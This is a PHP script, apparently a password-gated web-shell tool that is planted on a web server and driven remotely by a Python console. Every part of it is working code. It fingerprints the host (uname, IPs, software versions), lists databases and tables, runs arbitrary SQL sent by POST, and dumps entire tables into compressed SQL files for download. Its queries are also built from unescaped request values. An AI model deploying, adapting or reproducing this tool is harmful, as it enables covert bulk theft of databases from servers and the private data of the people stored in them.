<?php
/*
PHP MySQL Python Dumper

@version v1.5
@author Plum
@website http://p0wersurge.com
@email plumlulz@gmail.com
@year 2018
*/

//Update ini settings to increase memory limit and execution time
@ini_set("memory_limit","9999M");
@ini_set("max_input_time", 0);
@ini_set("max_execution_time", 0);

//Python Dump Class
class PythonDump {
	//Construct all MySQL credentials to variables
	function __construct() {
		$this->userpassword = $_POST['userpassword'];
		$this->mysqlhost = $_POST['mysqlhost'];
		$this->mysqlport = $_POST['mysqlport'];
		$this->mysqlpassword = $_POST['mysqlpassword'];
		$this->mysqlusername = $_POST['mysqlusername'];
		$this->password = '9cdfb439c7876e703e307864c9167a15'; //lol in md5; Use False for no password verification
	}

	//Creates a json string with a response code and the response from server
	function jsonify($responsecode, $response) {
		$jsonar = array(
			"response_code" => $responsecode,
			"response" => $response
		);
		$json = json_encode($jsonar);
		//Helps with debugging if there is a json error that occurs
		//Last json error will be sent back to Python console as the response
		$error = json_last_error();
		if($error) {
			$jsonar = array(
				"response_code" => "5",
				"response" => "JSON error: $error"
			);
			return json_encode($jsonar);
		}
		return $json;
	}
	//formatBytes function from Chris Jester-Young
	function formatBytes($size, $precision = 2) {
    	$base = log($size, 1024);
    	$suffixes = array('', 'KB', 'MB', 'GB', 'TB');
    	if ($size != 0) {
    		return round(pow(1024, $base - floor($base)), $precision).$suffixes[floor($base)];
    	} else {
    		return "0B";
    	}
	}
	//Simply checks to make sure password matches hash and user has access
	function check_password() {
		if ($this->password != False) {
			if(md5($this->userpassword) == $this->password) {
				return true;
			} else {
				return false;
			}
		} else {
			return True;
		}
	}
	//Connect to MySQL with provided credentials. 
	//Returns $pdo class to interact with or false if credentials are wrong
	function mysql_connect() {
		try {
			$pdo = new PDO('mysql:host='.$this->mysqlhost.';dbname=;charset=utf8', 
				$this->mysqlusername,
				$this->mysqlpassword, 
				array(PDO::ATTR_EMULATE_PREPARES => false, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION)
			);
			return $pdo;
		} catch(PDOException $e) {
				$this->emessage = $e->getMessage();
				return false;
		}
	}
	//Gets all databases on MySQL server
	//First argument is $pdo class from successful login
	//Second argument is a flag. If no flag just a list of dbs is jsonified
	//If flag is set to -size a list of dbs along with the size of each db is jsonified
	function get_databases($pdo, $flag) {
		$query = $pdo->query("SHOW DATABASES");
		$dbs = "";
		$size = 0;
		foreach($query as $db) {
			if($flag == "-size") {
				$pdo->exec("USE ".$db['Database']);
				$q = $pdo->prepare("SHOW TABLE STATUS");
			    $q->execute();
			    $result = $q->fetchAll();
			    foreach ($result as $row){
			      	$size += $row["Data_length"] + $row["Index_length"];  
			     }
				$dbs .= $db['Database'].":".$this->formatBytes($size)."\n";
				$size = 0;
			} else {
				$dbs .= $db['Database']."\n";
				$size = 1;
			}
		}
		return $this->jsonify($size, $dbs);
	}
	//Gets all tables from a provided database
	//First argument is $pdo class from successful login
	//Second argument is a flag. There are 2 flag options:
	//-size will jsonify all tables in db with the size of each table
	//-count will jsonify all tables in db with the row count of each table
	//If no flag is provided then just the tables in db are jsonified
	//Only one flag can be sent at a time
	//Third argument is the database the tables are being fetched from
	function get_tables($pdo, $flag, $db) {
		$rescode = 0;
		try {
			$pdo->exec("USE `$db`");
		} catch(PDOException $e) {
				$this->emessage = $e->getMessage();
				die($this->jsonify($rescode, $this->emessage));
		}
		$query = $pdo->query("SHOW TABLES");
		$tables = "";
		while ($row = $query->fetch(PDO::FETCH_ASSOC)) {
			if($flag == "-count") {
				$rows = $pdo->query("SELECT count(*) FROM ".$row['Tables_in_'.$db]."")->fetchColumn();
				$tables .= $row['Tables_in_'.$db].":".$rows."\n";
				$rescode = 2;
			} else if($flag == "-size") {
				$status = $pdo->query("SHOW TABLE STATUS WHERE Name='".$row['Tables_in_'.$db]."'")->fetch();
				$size = $status["Data_length"] + $status["Index_length"];
				$tables .= $row['Tables_in_'.$db].":".$this->formatBytes($size)."\n";
				$rescode = 3;
			} else {
				$rescode = 1;
				$tables .= $row['Tables_in_'.$db]."\n";
			}
		}
		return $this->jsonify($rescode, $tables);
	}

	//Dumps table from a database
	//First argument is $pdo class from successful login
	//Second argument is database that table is being dumped from
	//Third argument is table that is being dumped
	//Fourth argument is the current chunk of a larger table that is being dumped
	//If the rowcount of the table is < 10,000 rows the table will be dumped in one request
	//If the rowcount of the table is > 100,000 rows it requires to be dumped in chunks
	//Tables that need to be chunked will return the rowcount to the python console
	//Python console will handle creating each request required to dump entire table
	function dump_table($pdo, $db, $table, $currentchunk) {
		try {
			$rowcount = $pdo->query("SELECT count(*) FROM $db.$table")->fetchColumn();
		} catch(PDOException $e) {
				$this->emessage = $e->getMessage();
				die($this->jsonify(0, $this->emessage));
		}
		if ($rowcount > 10000) {
			if(!is_numeric($currentchunk)) {
				//Return rowcount of table so python can create all requests needed to dump table
				return $this->jsonify(1, "$rowcount");
			} else {
				$dump_content = "";
				if($currentchunk == 0){
					//Start of dump add header
					$drop = "DROP TABLE IF EXISTS `$table`;\n";
					$create_table = $pdo->query("SHOW CREATE TABLE $db.$table")->fetchColumn(1).";\n";
					$lock = "LOCK TABLES `$table` WRITE;\n";
					$dump_content .= $drop.$create_table.$lock;
				}
				//Dump chunk of table
				$lim = $currentchunk * 10000;
				$table_data = $pdo->query("SELECT * FROM $db.$table LIMIT $lim,10000");
				while($row = $table_data->fetch(PDO::FETCH_ASSOC)) {
					$avalues = array_values($row);
		            $akeys = array_keys($row);
		            $addslash = array_map('addSlashes', $avalues);
		            $fields = implode("`, `", $akeys);
		            $values = implode("', '", $addslash);
		            $dump_content .= "INSERT INTO `$table` (`$fields`) VALUES ('$values');\n";
				}
				if($currentchunk == floor($rowcount / 10000)) {
					//Last chunk of table so unlock the table in sql file
					$unlock = "UNLOCK TABLES;\n\n";
					$dump_content .= $unlock;
				}
				//Write dump content to it's own file based on chunk number
				//This is done to keep everything in order while sending multiple requests at a time
				//Once all chunks have been dumped they will be gzipped into one file in order based on chunk number
				file_put_contents("./dumps/".$db."_".$table."_".$currentchunk.".sql", $dump_content);
	   			//return $this->jsonify(4, "LOL");
				//return $dump_content;
			}
		} else {
			//Table is < 10,000 rows so a one request dump is done
			$dump_content = "";
			$table_data = $pdo->query("SELECT * FROM $db.$table");
			while($row = $table_data->fetch(PDO::FETCH_ASSOC)) {
				$avalues = array_values($row);
	            $akeys = array_keys($row);
	            $addslash = array_map('addSlashes', $avalues);
	            $fields = implode("`, `", $akeys);
	            $values = implode("', '", $addslash);
	            $dump_content .= "INSERT INTO `$table` (`$fields`) VALUES ('$values');\n";
			}
			$create_table = $pdo->query("SHOW CREATE TABLE $db.$table");
			$drop = "DROP TABLE IF EXISTS `$table`;\n";
	        $create = $create_table->fetchColumn(1).";\n";
	        $lock = "LOCK TABLES `$table` WRITE;\n";
	        $unlock = "UNLOCK TABLES;\n\n";
	        //Write dump content to sql file
	        file_put_contents("./dumps/".$db."_".$table.".sql", $drop.$create.$lock.$dump_content.$unlock);
			return $this->jsonify(2, "Dumped table: $table");
		}
	}

	function execute_query($pdo, $query, $database) {
		try {
			$use = $pdo->exec("USE $database");
		}	catch(PDOException $e) {
				$this->emessage = $e->getMessage();
				return $this->jsonify(0, $this->emessage);
		}
		try {
			$q = $pdo->query($query);
			$count = $q->rowCount();
			if ($count == 0) {
				return $this->jsonify(0, "No results for query.");
			}
			else {
				$data = array();
				while($row = $q->fetch(PDO::FETCH_ASSOC)) {
					array_push($data, $row);
				}
				if(empty($data)) {
					return $this->jsonify(2, $count);
				} else {
					return $this->jsonify(1, json_encode($data));
				}
			}
		} catch(PDOException $e) {
			$this->emessage = $e->getMessage();
			return $this->jsonify(0, $this->emessage);
		}
	}

	function compress($sourcefile, $writefile) {
		$json = json_decode($sourcefile);
		foreach($json->files as $file) {
			$gz = gzopen("./dumps/".$writefile, 'a9');
			$open = fopen("./dumps/".$file,'rb');
			while (!feof($open)) {
				gzwrite($gz, fread($open, 1024 * 512));
			} 
	        fclose($open);
	        gzclose($gz);
	        unlink("./dumps/".$file);
		}
		return $this->jsonify(0, "LOL");
	}
}

//If any post data is sent PythonDump class is started to check for password and MySQL credentials
if(!empty($_POST)) {
	$msd = new PythonDump();
	//Check to make sure password is correct
	if($msd->check_password()) {
		//If the password is correct MySQL credentials will be tested
		$mysql = $msd->mysql_connect();
		if($mysql) {
			if(count($_POST) == 5) {
				//If MySQL info was right some information about server will be sent back
				//Only send server info upon the first connection
				//All requests sent after initial connection will contain more than 5 POST vars
				//So if 5 POST vars are sent it is the initial connection
				$version = $mysql->query('select version()')->fetchColumn();
				$status = $mysql->getAttribute(constant("PDO::ATTR_CONNECTION_STATUS"));
				$phpversion = phpversion();
				$uname = php_uname();
				$serverip = $_SERVER['SERVER_ADDR'];
				$userip = $_SERVER['REMOTE_ADDR'];
				$software = $_SERVER['SERVER_SOFTWARE'];
				echo $msd->jsonify(1, "Welcome to MySQL.py\n\nMySQL Version: $version\nMySQL Connection Status: $status\nUser IP: $userip\nServer IP: $serverip\nServer Software: $software\nPHP Version: $phpversion\nUname: $uname\n");
			}
		} else {
			//MySQL error is jsonified and sent back to python console
			die($msd->jsonify(0, $msd->emessage));
		}
	} else {
		//File password was wrong 
		die($msd->jsonify(0, "Wrong Password"));
	}
}

if(isset($_POST['get_databases'])) {
	echo $msd->get_databases($mysql, $_POST['get_databases']);
}
if(isset($_POST['get_tables'])) {
	echo $msd->get_tables($mysql, $_POST['get_tables'], $_POST['database']);
}
if(isset($_POST['dump_table'])) {
	header("Content-type: application/json; charset=utf-8");
	echo $msd->dump_table($mysql, $_POST['db'], $_POST['table'], null);
}
if(isset($_POST['split_table'])) {
	header("Content-type: application/json; charset=utf-8");
	echo $msd->dump_table($mysql, $_POST['db'], $_POST['table'], $_POST['currentchunk']);
}
if(isset($_POST['compress'])) {
	echo $msd->compress($_POST['source_file'], $_POST['write_file']);
}
if(isset($_POST['sql_query'])) {
	echo $msd->execute_query($mysql, $_POST['query'], $_POST['database']);
}
?>
